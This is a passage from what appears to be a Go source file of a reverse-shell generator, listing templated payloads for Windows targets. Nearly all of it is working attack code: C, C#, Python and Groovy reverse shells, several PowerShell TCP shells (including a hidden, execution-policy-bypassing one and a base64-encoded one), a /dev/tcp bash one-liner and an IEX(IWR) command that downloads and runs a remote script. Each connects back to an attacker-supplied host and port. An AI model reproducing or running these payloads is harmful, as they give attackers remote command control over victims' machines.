    ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;

    TCHAR cmd[255] = TEXT("cmd.exe");

    CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &ini_processo, &processo_info);

    return 0;
	}
	`},
	{Name: "C# TCP Client", OS: []string{"Windows"}, ShellTpl: `
	using System;
	using System.Text;
	using System.IO;
	using System.Diagnostics;
	using System.ComponentModel;
	using System.Linq;
	using System.Net;
	using System.Net.Sockets;


	namespace ConnectBack
	{
		public class Program
		{
			static StreamWriter streamWriter;

			public static void Main(string[] args)
			{
				using(TcpClient client = new TcpClient("{{HOST}}", {{PORT}}))
				{
					using(Stream stream = client.GetStream())
					{
						using(StreamReader rdr = new StreamReader(stream))
						{
							streamWriter = new StreamWriter(stream);
							
							StringBuilder strInput = new StringBuilder();

							Process p = new Process();
							p.StartInfo.FileName = "/bin/sh";
							p.StartInfo.CreateNoWindow = true;
							p.StartInfo.UseShellExecute = false;
							p.StartInfo.RedirectStandardOutput = true;
							p.StartInfo.RedirectStandardInput = true;
							p.StartInfo.RedirectStandardError = true;
							p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
							p.Start();
							p.BeginOutputReadLine();

							while(true)
							{
								strInput.Append(rdr.ReadLine());
								//strInput.Append("\n");
								p.StandardInput.WriteLine(strInput);
								strInput.Remove(0, strInput.Length);
							}
						}
					}
				}
		}

		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }

		}
	}
	`},
	{Name: "C# Bash -i", OS: []string{"Windows"}, ShellTpl: `
	using System;
	using System.Diagnostics;

	namespace BackConnect {
		class ReverseBash {
		public static void Main(string[] args) {
			Process proc = new System.Diagnostics.Process();
			proc.StartInfo.FileName = "/bin/sh";
			proc.StartInfo.Arguments = "-c \"/bin/sh -i >& /dev/tcp/{{HOST}}/{{PORT}} 0>&1\"";
			proc.StartInfo.UseShellExecute = false;
			proc.StartInfo.RedirectStandardOutput = true;
			proc.Start();

			while (!proc.StandardOutput.EndOfStream) {
				Console.WriteLine(proc.StandardOutput.ReadLine());
			}
		}
	}
	`},
	{Name: "Windows ConPty", OS: []string{"Windows"}, ShellTpl: "IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell {{HOST}} {{PORT}}"},
	{Name: "PowerShell #1", OS: []string{"Windows"}, ShellTpl: "$LHOST = \"{{HOST}}\"; $LPORT = {{PORT}}; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write(\"$Output`n\"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()"},
	{Name: "PowerShell #2", OS: []string{"Windows"}, ShellTpl: "powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{{HOST}}',{{PORT}});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\""},
	{Name: "PowerShell #3", OS: []string{"Windows"}, ShellTpl: "powershell -nop -W hidden -noni -ep bypass -c \"$TCPClient = New-Object Net.Sockets.TCPClient('{{HOST}}', {{PORT}});$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()\""},
	{Name: "PowerShell #4 (TLS)", OS: []string{"Windows"}, ShellTpl: "$sslProtocols = [System.Security.Authentication.SslProtocols]::Tls12; $TCPClient = New-Object Net.Sockets.TCPClient('{{HOST}}', {{PORT}});$NetworkStream = $TCPClient.GetStream();$SslStream = New-Object Net.Security.SslStream($NetworkStream,$false,({$true} -as [Net.Security.RemoteCertificateValidationCallback]));$SslStream.AuthenticateAsClient('cloudflare-dns.com',$null,$sslProtocols,$false);if(!$SslStream.IsEncrypted -or !$SslStream.IsSigned) {$SslStream.Close();exit}$StreamWriter = New-Object IO.StreamWriter($SslStream);function WriteToStream ($String) {[byte[]]$script:Buffer = New-Object System.Byte[] 4096 ;$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()};WriteToStream '';while(($BytesRead = $SslStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()"},
	{Name: "PowerShell #3 (Base64)", OS: []string{"Windows"}, ShellTpl: "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQAwAC4AMQAwACIALAA5ADAAMAAxACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="},
	{Name: "Python3 Windows", OS: []string{"Windows"}, ShellTpl: `
	import os,socket,subprocess,threading;
	def s2p(s, p):
			while True:
					data = s.recv(1024)
					if len(data) > 0:
							p.stdin.write(data)
							p.stdin.flush()

	def p2s(s, p):
			while True:
					s.send(p.stdout.read(1))

	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect(("{{HOST}}",{{PORT}}))

	p=subprocess.Popen(["/bin/sh"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)

	s2p_thread = threading.Thread(target=s2p, args=[s, p])
	s2p_thread.daemon = True
	s2p_thread.start()

	p2s_thread = threading.Thread(target=p2s, args=[s, p])
	p2s_thread.daemon = True
	p2s_thread.start()

	try:
			p.wait()
	except KeyboardInterrupt:
			s.close()
	`},
	{Name: "Groovy", OS: []string{"Windows"}, ShellTpl: "String host=\"{{HOST}}\";int port={{PORT}};String cmd=\"/bin/sh\";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();"},
}
